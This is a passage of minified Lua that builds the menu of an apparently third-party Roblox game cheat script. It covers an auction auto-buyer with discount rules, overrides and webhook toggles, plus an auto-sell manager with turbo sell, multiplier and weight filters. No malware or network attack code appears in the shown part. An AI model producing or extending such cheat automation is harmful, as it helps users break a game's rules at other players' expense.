		Icon = "gavel"
	})
	local V = G:AddLeftGroupbox("<font color=\'#FF3333\'>Fast Auction</font>", "zap")
	local Z = G:AddRightGroupbox("<font color=\'#FF3333\'>Manual Purchase</font>", "mouse-pointer-click")
	local j = G:AddLeftGroupbox("Auctioneer Control", "gavel")
	local i = G:AddRightGroupbox("Item Filter", "list-filter")
	local c = G:AddLeftGroupbox("Override Filters", "sliders-horizontal")
	local J = G:AddRightGroupbox("Active Override Items", "list-checks")
	local T = G:AddRightGroupbox("Live Lots", "activity")
	local u = G:AddLeftGroupbox("Auction Logs", "history")
	local q = g.GetCheckIfPro() == true
	local function H(G)
		if q then
			return
		end
		if G and type(G.SetDisabled) == "function" then
			G:SetDisabled(true)
		end
	end
	if V then
		V:AddLabel({
			Text = "Buys any affordable live auction item immediately once it reaches the selected discount. The highest current price is attempted first.",
			DoesWrap = true
		})
		if not q then
			V:AddLabel({
				Text = g.GetProMessage();
				DoesWrap = true
			})
		end
		g.FastAuctionUiRefs.StatusLabel = V:AddLabel({
			Text = g.FastAuctionStatusText ~= "" and g.FastAuctionStatusText or "<font color=\'#888888\'>Ready.</font>",
			DoesWrap = true
		})
		local G
		G = V:AddInput("fast_auction_min_percent_ui", {
			Text = string.format("Minimum discount: %d%%", math.clamp(math.floor(tonumber(h.fast_auction_min_percent) or 50), 0, 100)),
			Default = tostring(h.fast_auction_min_percent),
			Numeric = true,
			AllowEmpty = false;
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "50",
			Tooltip = "0% allows the starting price. Higher percentages wait for a cheaper live price.",
			Callback = function(V)
				local y = z(V)
				if y == nil or y < 0 or y > 100 then
					g.Notify("Discount must be 0 to 100", 3)
					G:SetValue(tostring(h.fast_auction_min_percent))
					return
				end
				h.fast_auction_min_percent = y
				G:SetText(string.format("Minimum discount: %d%%", y))
				a.Save.SaveDataSync()
			end
		})
		H(G)
		local y = V:AddToggle("fast_auction_enabled_ui", {
			Text = "\226\154\161 Auto buy affordable items";
			Default = h.fast_auction_enabled == true;
			Tooltip = "Immediately attempts the most expensive affordable live item that meets the discount.";
			DisabledTooltip = g.GetProMessage();
			Callback = function(G)
				h.fast_auction_enabled = G == true
				if h.fast_auction_enabled == true then
					Y.FastAuction.SetStatusFastAuction("Checking live auction items...", "#FFCC66")
					Y.FastAuction.RequestSnapshotFastAuction(true)
				else
					Y.FastAuction.SetStatusFastAuction("Stopped.", "#888888")
				end
				a.Save.SaveDataSync()
			end
		})
		g.FastAuctionUiRefs.AutoToggle = y
		H(y)
	end
	if Z then
		Z:AddLabel({
			Text = "Current and recently ended auction items appear below. Live items can be pressed to buy; ended items remain visible with their final shown price.";
			DoesWrap = true
		})
		if not q then
			Z:AddLabel({
				Text = g.GetProMessage();
				DoesWrap = true
			})
		end
		g.FastAuctionUiRefs.ManualStatusLabel = Z:AddLabel({
			Text = "<font color=\'#888888\'>Waiting for live auction items.</font>",
			DoesWrap = true
		})
		g.FastAuctionUiRefs.ManualGroup = Z
		g.FastAuctionUiRefs.ManualButtons = g.FastAuctionUiRefs.ManualButtons or {}
		Y.FastAuction.RefreshManualButtonsFastAuction(true)
	end
	local function r(G)
		local V = tonumber(G)
		if not V then
			V = E.Currency.ParseMoney(tostring(G or h.auctioneer_min_sheckles or 0))
		end
		return "\240\159\146\176 Minimum Sheckles: " .. E.Currency.FormatMoney(math.max(V or 0, 0))
	end
	local function e(G)
		local V = math.clamp(math.floor(tonumber(G) or 50), 0, 100)
		return string.format("\240\159\147\137 Global Buy Percent: <font color=\'#66CCFF\'>%d%%+</font>", V)
	end
	if j then
		if not q then
			j:AddLabel({
				Text = g.GetProMessage();
				DoesWrap = true
			})
		end
		local G = j:AddToggle("auctioneer_preview_only_ui", {
			Text = "\240\159\145\128 Preview Only",
			Default = h.auctioneer_preview_only == true,
			Tooltip = "Shows what would be bought without spending sheckles.",
			DisabledTooltip = g.GetProMessage();
			Callback = function(G)
				h.auctioneer_preview_only = G == true
				a.Save.SaveDataSync()
			end
		})
		H(G)
		local V
		V = j:AddInput("auctioneer_min_sheckles_ui", {
			Text = r(h.auctioneer_min_sheckles),
			Default = E.Currency.FormatMoney(h.auctioneer_min_sheckles),
			Numeric = false,
			AllowEmpty = true,
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "0 or 50m";
			Tooltip = "Only buys when your current sheckles are at least this amount. 0 disables this check.",
			Callback = function(G)
				local y = (tostring(G or "")):match("^%s*(.-)%s*$") or ""
				local Z = y == "" and 0 or E.Currency.ParseMoney(y)
				if not Z or Z < 0 then
					g.Notify("Invalid sheckles amount", 3)
					V:SetValue(E.Currency.FormatMoney(h.auctioneer_min_sheckles))
					return
				end
				h.auctioneer_min_sheckles = math.floor(Z)
				V:SetText(r(h.auctioneer_min_sheckles))
				a.Save.SaveDataSync()
			end
		})
		H(V)
		local y
		y = j:AddInput("auctioneer_min_percent_ui", {
			Text = e(h.auctioneer_min_percent),
			Default = tostring(h.auctioneer_min_percent),
			Numeric = true;
			AllowEmpty = true,
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "50";
			Tooltip = "Selected items buy when auction discount reaches this percent. 90%+ is near the lowest price range.";
			Callback = function(G)
				local V = z(G)
				if V == nil or V < 0 or V > 100 then
					g.Notify("Percent must be 0 to 100", 3)
					y:SetValue(tostring(h.auctioneer_min_percent))
					return
				end
				h.auctioneer_min_percent = V
				y:SetText(e(V))
				a.Save.SaveDataSync()
			end
		})
		H(y)
		local Z = j:AddToggle("auctioneer_enabled_ui", {
			Text = "\240\159\148\168 Enable Auctioneer";
			Default = h.auctioneer_enabled == true,
			Tooltip = "Automatically buys selected auction items when their rule is reached.",
			DisabledTooltip = g.GetProMessage();
			Callback = function(G)
				h.auctioneer_enabled = G == true
				if G == true then
					Y.Auctioneer.RequestSnapshotAuctioneer("manual")
				else
					Y.Auctioneer.SetStatusAuctioneer("", "#FFFFFF")
				end
				a.Save.SaveDataSync()
			end
		})
		H(Z)
		local i = j:AddToggle("auctioneer_webhook_success_ui", {
			Text = "\226\156\133 Webhook Buys";
			Default = h.auctioneer_webhook_success == true,
			Tooltip = "Sends a webhook when Auctioneer buys an item.";
			DisabledTooltip = g.GetProMessage(),
			Callback = function(G)
				h.auctioneer_webhook_success = G == true
				a.Save.SaveDataSync()
			end
		})
		H(i)
		local c = j:AddToggle("auctioneer_webhook_fail_ui", {
			Text = "\226\157\140 Webhook Fails",
			Default = h.auctioneer_webhook_fail == true;
			Tooltip = "Sends a webhook when an Auctioneer buy is rejected.";
			DisabledTooltip = g.GetProMessage();
			Callback = function(G)
				h.auctioneer_webhook_fail = G == true
				a.Save.SaveDataSync()
			end
		})
		H(c)
	end
	if i then
		i:AddLabel({
			Text = "Select what Auctioneer can buy. Blocked items are always skipped.",
			DoesWrap = true
		})
		local G
		local V
		G = i:AddValueDropdown("auctioneer_buy_selected_ui", {
			Values = {};
			Default = {};
			Multi = true,
			Searchable = true;
			MaxVisibleDropdownItems = 10;
			Text = "\226\156\133 Buy Selected Items";
			Tooltip = "Only selected auction items can be bought. Empty selection buys nothing.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.auctioneer_buy_selected = G
				a.Save.SaveDataSync()
			end
		})
		g.AuctioneerUiRefs.ItemDropdown = G
		H(G)
		V = i:AddValueDropdown("auctioneer_blacklisted_items_ui", {
			Values = {},
			Default = {};
			Multi = true,
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Text = "\240\159\154\171 Block Items",
			Tooltip = "Auctioneer will never buy blocked item names, even if they are selected above.",
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.auctioneer_blacklisted_items = G
				a.Save.SaveDataSync()
			end
		})
		g.AuctioneerUiRefs.BlockDropdown = V
		H(V)
		local Z = i:AddButton({
			Text = "\240\159\142\175 Select Pet Lures",
			Tooltip = "Adds all Pet Lures to the selected auction items.",
			Func = function()
				if type(h.auctioneer_buy_selected) ~= "table" then
					h.auctioneer_buy_selected = {}
				end
				local V = 0
				local Z = type(y.PetLureData) == "table" and (type(y.PetLureData.Order) == "table" and y.PetLureData.Order) or {}
				for G, Z in ipairs(Z) do
					local j = type(y.PetLureData.Get) == "function" and y.PetLureData.Get(Z) or nil
					local i = type(j) == "table" and tostring(j.DisplayName or Z) or tostring(Z or "")
					if i ~= "" then
						h.auctioneer_buy_selected[i] = true
						V += 1
					end
				end
				G:SetValue(h.auctioneer_buy_selected)
				a.Save.SaveDataSync()
				g.Notify("Selected " .. (tostring(V) .. " Pet Lures"), 2)
			end
		})
		H(Z)
		local j = i:AddButton({
			Text = "\226\156\133 Select All";
			Tooltip = "Selects all known Auctioneer items.";
			Func = function()
				local V = {}
				for G, y in ipairs(Y.Auctioneer.GetItemDropdownAuctioneer()) do
					local Z = tostring(type(y) == "table" and y.Value or "")
					if Z ~= "" then
						V[Z] = true
					end
				end
				h.auctioneer_buy_selected = V
				G:SetValue(V)
				a.Save.SaveDataSync()
			end
		})
		H(j)
		local c = i:AddButton({
			Text = "\240\159\167\185 Clear Selected",
			Tooltip = "Clears selected auction items.",
			Func = function()
				h.auctioneer_buy_selected = {}
				G:SetValue({})
				a.Save.SaveDataSync()
			end
		})
		H(c)
		local J = i:AddButton({
			Text = "\240\159\167\185 Clear Blocked";
			Tooltip = "Clears blocked auction items.",
			Func = function()
				h.auctioneer_blacklisted_items = {}
				V:SetValue({})
				a.Save.SaveDataSync()
			end
		})
		H(J)
	end
	if c then
		c:AddLabel({
			Text = "Choose an item, set its price or percent rule, then enable it. Enabled overrides appear in Active Override Items.";
			DoesWrap = true
		})
		local G = ""
		local V = 0
		local y = 50
		local Z = 99999
		local j
		local i
		local J
		local T
		local function d(G)
			local j = Y.Auctioneer.GetOverrideAuctioneer(G)
			V = j and j.price or 0
			y = j and j.percent or 50
			Z = j and j.max_stock or 99999
			if i then
				i:SetValue(V > 0 and E.Currency.FormatMoney(V) or "0")
			end
			if J then
				J:SetValue(tostring(y))
			end
			if T then
				T:SetValue(tostring(Z))
			end
		end
		j = c:AddValueDropdown("auctioneer_override_item_ui", {
			Values = {};
			Default = "",
			Multi = false;
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Text = "\240\159\142\175 Override Item";
			Tooltip = "Choose the item to edit or create an override for.",
			Changed = function(V)
				G = tostring(V or "")
				d(G)
			end
		})
		g.AuctioneerUiRefs.OverrideItemDropdown = j
		H(j)
		i = c:AddInput("auctioneer_override_price_ui", {
			Text = "\240\159\146\176 Buy Under Price";
			Default = "0";
			Numeric = false,
			AllowEmpty = true,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "0 or 10b";
			Tooltip = "If above 0, this item buys only when the auction price is below this amount.",
			Callback = function(G)
				local y = (tostring(G or "")):match("^%s*(.-)%s*$") or ""
				local Z = y == "" and 0 or E.Currency.ParseMoney(y)
				if not Z or Z < 0 then
					g.Notify("Invalid override price", 3)
					i:SetValue(V > 0 and E.Currency.FormatMoney(V) or "0")
					return
				end
				V = math.floor(Z)
			end
		})
		H(i)
		J = c:AddInput("auctioneer_override_percent_ui", {
			Text = "\240\159\147\137 Override Percent";
			Default = "50",
			Numeric = true,
			AllowEmpty = true,
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "50";
			Tooltip = "Used only when Buy Under Price is 0.";
			Callback = function(G)
				local V = z(G)
				if V == nil or V < 0 or V > 100 then
					g.Notify("Override percent must be 0 to 100", 3)
					J:SetValue(tostring(y))
					return
				end
				y = V
			end
		})
		H(J)
		T = c:AddInput("auctioneer_override_max_stock_ui", {
			Text = "\240\159\147\166 Max Buy Stock",
			Default = "99999";
			Numeric = true,
			AllowEmpty = true,
			Finished = true,
			ClearTextOnFocus = false,
			Placeholder = "99999";
			Tooltip = "Maximum buys for this item during the current auction restock.",
			Callback = function(G)
				local V = z(G)
				if V == nil or V <= 0 then
					g.Notify("Max stock must be above 0", 3)
					T:SetValue(tostring(Z))
					return
				end
				Z = math.clamp(V, 1, 99999)
			end
		})
		H(T)
		local u = c:AddButton({
			Text = "\226\156\133 Enable Item",
			Tooltip = "Enables this item override and selects the item for buying.",
			Func = function()
				local j, i = Y.Auctioneer.SaveOverrideAuctioneer(G, V, y, Z)
				g.Notify(j and "Auction override enabled" or tostring(i or "Could not enable override"), j and 2 or 3)
			end
		})
		H(u)
		local q = c:AddButton({
			Text = "\240\159\151\145 Remove Override",
			Tooltip = "Removes the override for the selected item.",
			Func = function()
				if G == "" then
					g.Notify("Select an item first", 3)
					return
				end
				Y.Auctioneer.RemoveOverrideAuctioneer(G)
				d(G)
				g.Notify("Auction override removed", 2)
			end
		})
		H(q)
	end
	if J then
		local G = {}
		g.AuctioneerUiRefs.RefreshingOverrideRowsAuctioneer = false
		J:AddLabel({
			Text = "Each enabled override has its own toggle. Turning it off keeps the item selected but uses the global percent rule.";
			DoesWrap = true
		})
		local function V(G, V)
			if type(G) ~= "table" then
				return
			end
			if G.Toggle then
				G.Toggle:SetVisible(V)
			end
			if G.DeleteButton then
				G.DeleteButton:SetVisible(V)
			end
			if G.Divider then
				G.Divider:SetVisible(V)
			end
		end
		local function y(y)
			if type(y) ~= "table" then
				return nil
			end
			local Z = tostring(y.itemName or "")
			if Z == "" then
				return nil
			end
			local j = Y.Auctioneer.GetOverrideUiKeyAuctioneer(Z)
			local i = G[j]
			if not i then
				i = {
					itemName = Z
				}
				i.Toggle = J:AddToggle(j, {
					Text = Y.Auctioneer.GetOverrideSummaryAuctioneer(Z, y.rule);
					Default = type(y.rule) == "table" and y.rule.enabled ~= false;
					Tooltip = "Enable or disable this item override.";
					Callback = function(G)
						if g.AuctioneerUiRefs.RefreshingOverrideRowsAuctioneer then
							return
						end
						Y.Auctioneer.ToggleOverrideAuctioneer(Z, G)
					end
				})
				H(i.Toggle)
				i.DeleteButton = J:AddButton({
					Text = "\240\159\151\145 Remove Override",
					Tooltip = "Removes this item override.",
					Func = function()
						Y.Auctioneer.RemoveOverrideAuctioneer(Z)
					end
				})
				H(i.DeleteButton)
				i.Divider = J:AddLabel({
					Text = "<font color=\'#444444\'>\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128</font>";
					DoesWrap = false
				})
				G[j] = i
			end
			i.itemName = Z
			V(i, true)
			i.Toggle:SetText(Y.Auctioneer.GetOverrideSummaryAuctioneer(Z, y.rule))
			i.Toggle:SetValue(type(y.rule) == "table" and y.rule.enabled ~= false)
			return i
		end
		g.AuctioneerUiRefs.RefreshOverrideRowsAuctioneer = function()
			g.AuctioneerUiRefs.RefreshingOverrideRowsAuctioneer = true
			local Z = {}
			for G, V in ipairs(Y.Auctioneer.GetSortedOverridesAuctioneer()) do
				local j = tostring(V.itemName or "")
				if j ~= "" then
					local G = Y.Auctioneer.GetOverrideUiKeyAuctioneer(j)
					Z[G] = true
					y(V)
				end
			end
			for G, y in pairs(G) do
				if not Z[G] then
					V(y, false)
				end
			end
			g.AuctioneerUiRefs.RefreshingOverrideRowsAuctioneer = false
		end
		J:AddButton({
			Text = "\240\159\148\132 Refresh Overrides",
			Tooltip = "Refreshes the active override item list.";
			Func = function()
				Y.Auctioneer.RefreshOverridesAuctioneer()
			end
		})
	end
	if T then
		g.AuctioneerUiRefs.LiveLotsLabel = T:AddLabel({
			Text = "<font color=\'#888888\'>Waiting for auction lots.</font>";
			DoesWrap = true
		})
		local G = T:AddButton({
			Text = "\240\159\148\132 Refresh Live Lots",
			Tooltip = "Checks the current auction board.",
			Func = function()
				Y.Auctioneer.RequestSnapshotAuctioneer("manual")
			end
		})
		H(G)
	end
	if u then
		g.AuctioneerUiRefs.LogLabel = u:AddLabel({
			Text = "<font color=\'#888888\'>No auction logs yet.</font>";
			DoesWrap = true
		})
		local G = u:AddButton({
			Text = "\240\159\167\185 Clear Logs",
			Tooltip = "Clears local Auctioneer logs for this session.",
			Func = function()
				table.clear(g.AuctioneerLogs)
				Y.Auctioneer.RefreshLogsAuctioneer()
			end
		})
		H(G)
	end
	Y.Auctioneer.RefreshItemDropdownAuctioneer()
	Y.Auctioneer.RefreshOverridesAuctioneer()
	Y.Auctioneer.RefreshLiveLotsAuctioneer()
	Y.Auctioneer.RefreshLogsAuctioneer()
end
g.SellingUi = function()
	local G = d:AddTab({
		Name = "Sell Manager",
		Description = "Sell pets, fruits and more.";
		Icon = "store"
	})
	local V = G:AddLeftGroupbox("Sell Fruits", "badge-dollar-sign")
	local y = G:AddRightGroupbox("Sell Filters", "sliders-horizontal")
	local j = G:AddRightGroupbox("Fruit Stock Multipliers", "chart-no-axes-column-increasing")
	local i = G:AddLeftGroupbox("Sell Pets", "paw-print")
	local c = G:AddRightGroupbox("Pet Sell Filters", "shield-check")
	if V then
		local function G(G)
			return "\226\173\144 Daily Deal Min Value: " .. E.Currency.FormatMoney(math.max(tonumber(G) or 0, 0))
		end
		V:AddToggle("daily_deal_status_enabled_ui", {
			Text = "\226\173\144 Show Daily Deal Status",
			Default = h.daily_deal_status_enabled == true,
			Tooltip = "Shows whether Daily Deal is ready or on cooldown without using it.",
			Callback = function(G)
				h.daily_deal_status_enabled = G == true
				Z.SellManager.DailyDealNextCheckAt = 0
				Z.SellManager.RefreshDailyDealStatusSellManager(true)
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("auto_use_daily_deal_ui", {
			Text = "\226\173\144 Save & Use Daily Deal";
			Default = h.auto_use_daily_deal,
			Tooltip = "Saves the Daily Deal until your fruit backpack is full. Set a min value to use it early once the backpack value is high enough.";
			Callback = function(G)
				h.auto_use_daily_deal = G == true
				Z.SellManager.DailyDealNextCheckAt = 0
				Z.SellManager.RefreshDailyDealStatusSellManager(true)
				a.Save.SaveDataSync()
			end
		})
		local y
		y = V:AddInput("daily_deal_min_backpack_value_ui", {
			Text = G(h.daily_deal_min_backpack_value);
			Default = E.Currency.FormatMoney(h.daily_deal_min_backpack_value),
			Numeric = false,
			AllowEmpty = true,
			Finished = true;
			ClearTextOnFocus = false,
			Placeholder = "0 or 50m",
			Tooltip = "Only uses Daily Deal when the current Daily Deal value reaches this amount. 0 keeps full-backpack saving.",
			Callback = function(V)
				local Z = (tostring(V or "")):match("^%s*(.-)%s*$") or ""
				local j = Z == "" and 0 or E.Currency.ParseMoney(Z)
				if not j or j < 0 then
					g.Notify("Invalid sheckles amount", 3)
					y:SetValue(E.Currency.FormatMoney(h.daily_deal_min_backpack_value))
					return
				end
				h.daily_deal_min_backpack_value = math.floor(j)
				y:SetText(G(h.daily_deal_min_backpack_value))
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("sell_when_backpack_full_ui", {
			Text = "\240\159\142\146 Sell When Backpack Is Full";
			Default = h.sell_when_backpack_full,
			Tooltip = "Automatically sells fruits when your backpack is full.";
			Callback = function(G)
				h.sell_when_backpack_full = G
				a.Save.SaveDataSync()
			end
		})
		V:AddToggle("autopsellfruitsturbo", {
			Text = "<font color=\'#CF02B0\'>\226\154\161 Turbo Sell</font>",
			Default = h.turbo_sell;
			Tooltip = "Sells really fast";
			Callback = function(G)
				h.turbo_sell = G
				a.Save.SaveData()
			end
		})
		V:AddToggle("autopsellfruits", {
			Text = "<font color=\'#CF02B0\'>\240\159\146\176 Enable Auto Sell</font>";
			Default = h.auto_sell_sellallinventory,
			Tooltip = "Sells your fruits.";
			Callback = function(G)
				h.auto_sell_sellallinventory = G
				a.Save.SaveData()
			end
		})
	end
	if j then
		j:AddToggle("sell_multiplier_enabled_ui", {
			Text = "\240\159\147\136 Enable Multiplier Selling",
			Default = h.sell_multiplier_enabled == true;
			Tooltip = "Sells selected fruits one by one only when their live multiplier reaches the rule.";
			Callback = function(G)
				h.sell_multiplier_enabled = G == true
				if not h.sell_multiplier_enabled then
					Z.SellMultiplierOverrides.SetStatusSellMultiplierOverrides("")
				end
				Z.SellMultiplierOverrides.MarkCollectOnlyCacheDirtySellMultiplierOverrides()
				a.Save.SaveDataSync()
			end
		})
		j:AddToggle("sell_multiplier_collect_only_ui", {
			Text = "\240\159\140\177 Apply to Fruit Collection Only";
			Default = h.sell_multiplier_collect_only == true,
			Tooltip = "Leaves matching fruits on the farm until their multiplier reaches the rule.";
			Callback = function(G)
				h.sell_multiplier_collect_only = G == true
				Z.SellMultiplierOverrides.MarkCollectOnlyCacheDirtySellMultiplierOverrides()
				a.Save.SaveDataSync()
			end
		})
		j:AddToggle("sell_multiplier_show_live_ui", {
			Text = "\240\159\147\139 Show Live Multipliers";
			Default = h.sell_multiplier_show_live == true,
			Tooltip = "Shows a right-side fruit multiplier board that can be hidden any time.";
			Callback = function(G)
				h.sell_multiplier_show_live = G == true
				Z.SellMultiplierOverrides.RefreshLiveBoardSellMultiplierOverrides()
				a.Save.SaveDataSync()
			end
		})
		local G = j:AddValueDropdown("sell_multiplier_board_fruits_ui", {
			Values = Z.SeedData.GetSeedDataListDropDown();
			Default = {};
			Multi = true,
			Searchable = true;
			MaxVisibleDropdownItems = 10;
			Text = "\240\159\147\139 Board Fruits",
			Tooltip = "Only selected fruits appear on the live board. Empty shows all live fruit stock.";
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.sell_multiplier_board_selected = G
				Z.SellMultiplierOverrides.RefreshLiveBoardSellMultiplierOverrides()
				a.Save.SaveDataSync()
			end
		})
		G:SetValue(h.sell_multiplier_board_selected)
		j:AddDivider()
		j:AddLabel({
			Text = "Create a fruit rule, then use the active rule toggles below to disable or remove it.",
			DoesWrap = true
		})
		local V = ""
		local y = 1
		local i = 0
		local c = j:AddValueDropdown("sell_multiplier_rule_fruit_ui", {
			Values = Z.SeedData.GetSeedDataListDropDown(),
			Default = "";
			Multi = false;
			Searchable = true,
			MaxVisibleDropdownItems = 10;
			Text = "\240\159\140\177 Rule Fruit",
			Tooltip = "Choose the fruit to sell by multiplier.",
			Changed = function(G)
				V = tostring(G or "")
			end
		})
		local J = j:AddValueDropdown("sell_multiplier_rule_value_ui", {
			Values = Z.SellMultiplierOverrides.GetMultiplierDropdownSellMultiplierOverrides();
			Default = "1";
			Multi = false;
			Searchable = false,
			MaxVisibleDropdownItems = 5;
			Text = "\240\159\147\136 Sell At Multiplier",
			Tooltip = "Selected fruit sells when the live multiplier is this value or higher.";
			Changed = function(G)
				y = math.clamp(tonumber(G) or 1, 1, 5)
			end
		})
		J:SetValue("1")
		local T
		T = j:AddInput("sell_multiplier_rule_min_kg_ui", {
			Text = "\226\154\150\239\184\143 Minimum KG: 0";
			Default = "0",
			Numeric = true,
			AllowEmpty = false;
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "0";
			Tooltip = "Only fruits at or above this weight use the multiplier rule.",
			Callback = function(G)
				local V = tonumber(G)
				if V == nil or V < 0 then
					g.Notify("Minimum KG must be 0 or higher", 3)
					T:SetValue(tostring(i))
					return
				end
				i = V
				T:SetText(string.format("\226\154\150\239\184\143 Minimum KG: %.2f", V))
			end
		})
		j:AddButton({
			Text = "\226\156\133 Enable Rule";
			Tooltip = "Adds or updates this fruit multiplier and KG rule.",
			Func = function()
				local G, j = Z.SellMultiplierOverrides.SaveOverrideSellMultiplierOverrides(V, y, i)
				g.Notify(G and "Multiplier rule enabled" or tostring(j or "Could not enable rule"), G and 2 or 3)
			end
		})
		local d = {}
		g.SellMultiplierOverrideUiRefs.RefreshingRowsSellMultiplierOverrides = false
		local function u(G, V)
			if type(G) ~= "table" then
				return
			end
			if G.Toggle then
				G.Toggle:SetVisible(V)
			end
			if G.DeleteButton then
				G.DeleteButton:SetVisible(V)
			end
			if G.Divider then
				G.Divider:SetVisible(V)
			end
		end
		local function q(G)
			if type(G) ~= "table" then
				return nil
			end
			local V = tostring(G.fruitName or "")
			if V == "" then
				return nil
			end
			local y = Z.SellMultiplierOverrides.GetOverrideUiKeySellMultiplierOverrides(V)
			local i = d[y]
			if not i then
				i = {
					fruitName = V
				}
				i.Toggle = j:AddToggle(y, {
					Text = Z.SellMultiplierOverrides.GetOverrideSummarySellMultiplierOverrides(V, G.rule),
					Default = type(G.rule) == "table" and G.rule.enabled ~= false;
					Tooltip = "Enable or disable this multiplier rule.";
					Callback = function(G)
						if g.SellMultiplierOverrideUiRefs.RefreshingRowsSellMultiplierOverrides then
							return
						end
						Z.SellMultiplierOverrides.ToggleOverrideSellMultiplierOverrides(V, G)
					end
				})
				i.DeleteButton = j:AddButton({
					Text = "\240\159\151\145 Remove Rule",
					Tooltip = "Removes this multiplier rule.";
					Func = function()
						Z.SellMultiplierOverrides.RemoveOverrideSellMultiplierOverrides(V)
					end
				})
				i.Divider = j:AddLabel({
					Text = "<font color=\'#444444\'>\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128\226\148\128</font>";
					DoesWrap = false
				})
				d[y] = i
			end
			i.fruitName = V
			u(i, true)
			i.Toggle:SetText(Z.SellMultiplierOverrides.GetOverrideSummarySellMultiplierOverrides(V, G.rule))
			i.Toggle:SetValue(type(G.rule) == "table" and G.rule.enabled ~= false)
			return i
		end
		g.SellMultiplierOverrideUiRefs.RefreshRowsSellMultiplierOverrides = function()
			g.SellMultiplierOverrideUiRefs.RefreshingRowsSellMultiplierOverrides = true
			local G = {}
			for V, y in ipairs(Z.SellMultiplierOverrides.GetSortedOverridesSellMultiplierOverrides()) do
				local j = tostring(y.fruitName or "")
				if j ~= "" then
					local V = Z.SellMultiplierOverrides.GetOverrideUiKeySellMultiplierOverrides(j)
					G[V] = true
					q(y)
				end
			end
			for V, y in pairs(d) do
				if not G[V] then
					u(y, false)
				end
			end
			g.SellMultiplierOverrideUiRefs.RefreshingRowsSellMultiplierOverrides = false
		end
		j:AddButton({
			Text = "\240\159\148\132 Refresh Rules",
			Tooltip = "Refreshes the active multiplier rules.";
			Func = function()
				Z.SellMultiplierOverrides.RefreshOverridesUiSellMultiplierOverrides()
			end
		})
		Z.SellMultiplierOverrides.RefreshOverridesUiSellMultiplierOverrides()
	end
	if y then
		y:AddLabel({
			Text = "\226\132\185\239\184\143 Enable filters to sell matching fruits one by one. Press Enter after changing KG values. Protected mutations or variants will not be sold.";
			DoesWrap = true
		})
		local G
		G = y:AddValueDropdown("sell_fruit_filter_list", {
			Values = {},
			Default = {};
			Multi = true,
			Text = "\240\159\140\177 Sell Fruits",
			Tooltip = "Only selected fruits will be sold when filters are enabled. Empty allows all fruit names.";
			Searchable = true;
			MaxVisibleDropdownItems = 10,
			Changed = function(G)
				if type(G) ~= "table" then
					return
				end
				h.sell_fruit_list = G
				a.Save.SaveDataSync()
			end
		})
		G:SetValues(Z.SellManager.GetSellFruitTypeDropdownWithBackpackCounts())
		G:SetValue(h.sell_fruit_list)
		y:AddButton({
			Text = "\226\153\187\239\184\143 Reload Sell List";
			Tooltip = "Refreshes backpack fruit counts in the list.",
			Func = function()
				G:SetValues(Z.SellManager.GetSellFruitTypeDropdownWithBackpackCounts())
				G:SetValue(h.sell_fruit_list)
			end
		})
		y:AddToggle("sell_filters_enabled_ui", {
			Text = "\240\159\155\161\239\184\143 Use Sell Filters";
			Default = h.sell_use_filters;
			Tooltip = "When enabled, only fruits passing the filters are sold one by one.",
			Callback = function(G)
				h.sell_use_filters = G
				a.Save.SaveDataSync()
			end
		})
		local V
		local j
		local function i(G)
			local V = f(G)
			if not V then
				V = tonumber(h.sell_min_weight) or 0
			end
			return string.format("\226\172\135\239\184\143 Min Sell %.2fKG", V)
		end
		local function c(G)
			local V = f(G)
			if not V then
				V = tonumber(h.sell_max_weight) or 89
			end
			return string.format("\226\172\134\239\184\143 Max Sell %.2fKG", V)
		end
		V = y:AddInput("sell_min_weight", {
			Text = i(h.sell_min_weight),
			Default = tostring(h.sell_min_weight),
			Numeric = true,
			AllowEmpty = true;
			Finished = true;
			ClearTextOnFocus = false;
			Placeholder = "Press Enter to update",
			Tooltip = "Press Enter to update. Fruits below this KG will not be sold.";
			Changed = function(G)
				if V then
					V:SetText(i(G))
				end
			end;
			Callback = function(G)
				local y = f(G)
				if not y then
					g.Notify("Invalid minimum sell KG", 3)
					V:SetValue(tostring(h.sell_min_weight))
					V:SetText(i(h.sell_min_weight))
					return
				end
				if y < 0 then
					g.Notify("Minimum sell KG must be 0 or more", 3)
					V:SetValue(tostring(h.sell_min_weight))
					V:SetText(i(h.sell_min_weight))
					return
				end
				local j = tonumber(h.sell_max_weight) or 89
				if y > j then
					g.Notify("Minimum sell KG must be lower than maximum KG", 3)
					V:SetValue(tostring(h.sell_min_weight))
					V:SetText(i(h.sell_min_weight))
					return
				end
				h.sell_min_weight = Z.FruitFilters.RoundWeight(y)
				V:SetText(i(h.sell_min_weight))
				a.Save.SaveDataSync()
			end
		})
		j = y:AddInput("sell_max_weight", {
			Text = c(h.sell_max_weight),
			Default = tostring(h.sell_max_weight);
			Numeric = true,
			AllowEmpty = true;
			Finished = true,
			ClearTextOnFocus = false;
			Placeholder = "Press Enter to update",
			Tooltip = "Press Enter to update. Fruits above this KG will not be sold.";
			Changed = function(G)
				if j then
					j:SetText(c(G))
				end
			end,
			Callback = function(G)
				local V = f(G)
				if not V then
					g.Notify("Invalid maximum sell KG", 3)
					j:SetValue(tostring(h.sell_max_weight))
					j:SetText(c(h.sell_max_weight))
					return
				end
				if V < 0 then
					g.Notify("Maximum sell KG must be 0 or more", 3)
					j:SetValue(tostring(h.sell_max_weight))
					j:SetText(c(h.sell_max_weight))
					return
				end
				local y = tonumber(h.sell_min_weight) or 0
